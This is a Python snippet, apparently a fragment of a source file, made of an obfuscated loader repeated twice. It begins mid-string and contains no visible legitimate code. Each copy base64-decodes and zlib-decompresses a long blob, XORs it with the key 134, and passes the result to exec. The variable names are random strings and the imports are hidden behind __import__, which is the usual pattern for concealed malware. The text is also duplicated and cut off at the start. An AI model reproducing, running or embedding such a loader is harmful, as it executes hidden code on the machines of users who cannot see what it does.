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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
